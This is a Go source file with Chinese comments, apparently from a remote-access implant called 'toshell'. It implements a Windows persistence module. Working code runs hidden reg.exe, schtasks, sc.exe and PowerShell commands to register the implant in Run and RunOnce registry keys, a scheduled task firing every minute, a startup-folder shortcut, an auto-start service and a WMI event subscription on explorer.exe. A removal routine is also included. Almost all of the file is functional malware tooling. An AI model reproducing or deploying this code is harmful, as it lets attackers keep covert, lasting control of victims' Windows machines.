//go:build windows && !light

package main

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// PersistenceMethod 持久化方法
type PersistenceMethod struct {
	Name        string `json:"name"`
	Description string `json:"description"`
	Reliable    bool   `json:"reliable"`
}

// listPersistenceMethods 返回所有支持的持久化方法
func listPersistenceMethods() []PersistenceMethod {
	return []PersistenceMethod{
		{Name: "registry_run", Description: "HKCU\\...\\Run 注册表启动项", Reliable: true},
		{Name: "registry_run_once", Description: "HKLM\\...\\RunOnce 注册表启动项 (需管理员)", Reliable: true},
		{Name: "scheduled_task", Description: "计划任务, 每分钟触发", Reliable: true},
		{Name: "startup_folder", Description: "启动文件夹快捷方式", Reliable: true},
		{Name: "service", Description: "Windows 服务安装 (需管理员)", Reliable: true},
		{Name: "wmi_subscription", Description: "WMI 事件订阅 (需管理员)", Reliable: false},
	}
}

// installPersistence 安装持久化
// method: 方法名
// exePath: implant 可执行文件路径 (空则自动获取)
func installPersistence(method string, exePath string) (string, int32, string) {
	if exePath == "" {
		var err error
		exePath, err = os.Executable()
		if err != nil {
			return "", -1, fmt.Sprintf("无法获取当前可执行文件路径: %v", err)
		}
	}

	// 确保路径是绝对路径
	absPath, err := filepath.Abs(exePath)
	if err != nil {
		absPath = exePath
	}

	switch method {
	case "registry_run":
		return installRegistryRun(absPath)
	case "registry_run_once":
		return installRegistryRunOnce(absPath)
	case "scheduled_task":
		return installScheduledTask(absPath)
	case "startup_folder":
		return installStartupFolder(absPath)
	case "service":
		return installService(absPath)
	case "wmi_subscription":
		return installWMI(absPath)
	default:
		return "", -1, fmt.Sprintf("不支持的持久化方法: %s", method)
	}
}

// registerRunKey 写入 HKCU\Software\Microsoft\Windows\CurrentVersion\Run
func installRegistryRun(exePath string) (string, int32, string) {
	name := filepath.Base(exePath)
	name = strings.TrimSuffix(name, ".exe")
	if name == "" {
		name = "toshell"
	}

	cmd := execHidden(sysBin("reg.exe"), "add",
		`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
		"/v", name,
		"/t", "REG_SZ",
		"/d", exePath,
		"/f",
	)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", -1, fmt.Sprintf("注册表写入失败: %v\n%s", err, string(output))
	}
	return fmt.Sprintf("[+] 持久化成功 (Registry Run): %s -> %s", name, exePath), 0, ""
}

// installRegistryRunOnce 写入 HKLM\...\RunOnce (需管理员)
func installRegistryRunOnce(exePath string) (string, int32, string) {
	name := "toshell_update"
	cmd := execHidden(sysBin("reg.exe"), "add",
		`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce`,
		"/v", name,
		"/t", "REG_SZ",
		"/d", exePath,
		"/f",
	)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", -1, fmt.Sprintf("注册表写入失败 (需要管理员权限): %v\n%s", err, string(output))
	}
	return fmt.Sprintf("[+] 持久化成功 (Registry RunOnce): %s", exePath), 0, ""
}

// installScheduledTask 创建计划任务
func installScheduledTask(exePath string) (string, int32, string) {
	name := "toshell_check"
	// 使用 schtasks 创建每分钟触发的任务
	cmd := execHidden(sysBin("schtasks.exe"), "/create",
		"/tn", name,
		"/tr", exePath,
		"/sc", "minute",
		"/mo", "1",
		"/f",
	)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", -1, fmt.Sprintf("计划任务创建失败: %v\n%s", err, string(output))
	}
	return fmt.Sprintf("[+] 持久化成功 (Scheduled Task): %s (每分钟)", name), 0, ""
}

// installStartupFolder 写入启动文件夹
func installStartupFolder(exePath string) (string, int32, string) {
	// 启动文件夹路径
	appData := os.Getenv("APPDATA")
	if appData == "" {
		appData = os.Getenv("USERPROFILE")
	}
	startupDir := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	lnkPath := filepath.Join(startupDir, "toshell.lnk")

	// 使用 PowerShell 创建快捷方式
	psScript := fmt.Sprintf(
		`$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%s'); $Shortcut.TargetPath = '%s'; $Shortcut.WindowStyle = 7; $Shortcut.Save()`,
		lnkPath, exePath,
	)
	cmd := execHidden(sysPowershell(), "-NoProfile", "-WindowStyle", "Hidden", "-Command", psScript)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", -1, fmt.Sprintf("启动文件夹写入失败: %v\n%s", err, string(output))
	}
	return fmt.Sprintf("[+] 持久化成功 (Startup Folder): %s", lnkPath), 0, ""
}

// installService 安装 Windows 服务
func installService(exePath string) (string, int32, string) {
	name := "toshell_svc"
	cmd := execHidden(sysBin("sc.exe"), "create", name,
		"binPath=", exePath,
		"start=", "auto",
		"DisplayName=", "ToShell Service",
	)
	output, err := cmd.CombinedOutput()
	if err != nil {
		// 尝试先删除再创建
		execHidden(sysBin("sc.exe"), "stop", name).Run()
		execHidden(sysBin("sc.exe"), "delete", name).Run()
		cmd = execHidden(sysBin("sc.exe"), "create", name,
			"binPath=", exePath,
			"start=", "auto",
			"DisplayName=", "ToShell Service",
		)
		output, err = cmd.CombinedOutput()
		if err != nil {
			return "", -1, fmt.Sprintf("服务安装失败 (需要管理员权限): %v\n%s", err, string(output))
		}
	}

	// 启动服务
	execHidden(sysBin("sc.exe"), "start", name).Run()
	return fmt.Sprintf("[+] 持久化成功 (Service): %s", name), 0, ""
}

// installWMI 创建 WMI 事件订阅
func installWMI(exePath string) (string, int32, string) {
	// WMI __EventFilter + __CommandLineEventConsumer
	// 当进程启动时触发 implant
	psScript := fmt.Sprintf(`
$FilterArgs = @{
    Name = 'ToshellFilter'
    EventNamespace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'"
}
$Filter = Set-WmiInstance -Class __EventFilter -Arguments $FilterArgs

$ConsumerArgs = @{
    Name = 'ToshellConsumer'
    CommandLineTemplate = '%s'
}
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Arguments $ConsumerArgs

$BindingArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Class __FilterToConsumerBinding -Arguments $BindingArgs
`, exePath)

	cmd := execHidden(sysPowershell(), "-NoProfile", "-WindowStyle", "Hidden", "-Command", psScript)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", -1, fmt.Sprintf("WMI 安装失败 (需要管理员权限): %v\n%s", err, string(output))
	}
	return "[+] 持久化成功 (WMI Subscription)", 0, ""
}

// removePersistence 移除所有持久化
func removePersistence(exePath string) (string, int32, string) {
	if exePath == "" {
		var err error
		exePath, _ = os.Executable()
		if err != nil {
			exePath, _ = filepath.Abs(".")
		}
	}

	var results []string

	// 移除注册表 Run
	name := filepath.Base(exePath)
	name = strings.TrimSuffix(name, ".exe")
	execHidden(sysBin("reg.exe"), "delete",
		`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
		"/v", name, "/f",
	).Run()
	results = append(results, "[✓] Registry Run removed")

	// 移除计划任务
	execHidden(sysBin("schtasks.exe"), "/delete", "/tn", "toshell_check", "/f").Run()
	results = append(results, "[✓] Scheduled Task removed")

	// 移除启动文件夹快捷方式
	appData := os.Getenv("APPDATA")
	if appData == "" {
		// 与 installStartupFolder 同源兜底：APPDATA 缺失时不能拼出 "\Microsoft\..." 这种根路径
		appData = os.Getenv("USERPROFILE")
	}
	startupDir := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	os.Remove(filepath.Join(startupDir, "toshell.lnk"))
	results = append(results, "[✓] Startup Folder shortcut removed")

	// 移除服务
	execHidden(sysBin("sc.exe"), "stop", "toshell_svc").Run()
	execHidden(sysBin("sc.exe"), "delete", "toshell_svc").Run()
	results = append(results, "[✓] Service removed")

	return strings.Join(results, "\n"), 0, ""
}

// handlePersistence 处理持久化任务
func handlePersistence(data string) (string, int32, string) {
	var req struct {
		Action  string `json:"action"`
		Method  string `json:"method"`
		ExePath string `json:"exe_path"`
	}
	if err := json.Unmarshal([]byte(data), &req); err != nil {
		return "", -1, fmt.Sprintf("持久化任务解析失败: %v", err)
	}

	switch req.Action {
	case "list":
		// 旧实现直接回传 json.Marshal(methods)：操作员在任务回显里看到的是一坨
		// `[{"name":...}]`，既不好读、又恰好被 executeTask 末尾的整串 GBK→UTF-8
		// 打成乱码（本次一同修掉）。这里改成稳定的管道分隔表（含表头），字段顺序
		// 固定为 方法名 | 可靠 | 说明，前端/人工都按同一份顺序读，不再有"字段错位"。
		return formatPersistenceMethods(listPersistenceMethods()), 0, ""
	case "install":
		return installPersistence(req.Method, req.ExePath)
	case "remove":
		return removePersistence(req.ExePath)
	default:
		return "", -1, fmt.Sprintf("未知操作: %s", req.Action)
	}
}

// formatPersistenceMethods 把方法列表渲染成人类可读的表格。
//
// 为什么用 " | " 分隔而不是对齐列：中文显示宽度是 2、ASCII 是 1，按字节/字符
// %-20s 补齐在终端和 Web 回显里都会错位；管道分隔的固定字段顺序没有对齐假设。
// 首行是表头，**不会出现空表头**：方法列表恒非空，长度信息放在末尾一行。
func formatPersistenceMethods(methods []PersistenceMethod) string {
	var b strings.Builder
	b.WriteString("== 持久化方法（启动项）列表 ==\n")
	b.WriteString("方法名 | 可靠 | 说明\n")
	for _, m := range methods {
		reliable := "否"
		if m.Reliable {
			reliable = "是"
		}
		b.WriteString(fmt.Sprintf("%s | %s | %s\n", m.Name, reliable, m.Description))
	}
	b.WriteString(fmt.Sprintf("共 %d 项；安装时把「方法名」作为 method 传给 persistence install。\n", len(methods)))
	return b.String()
}
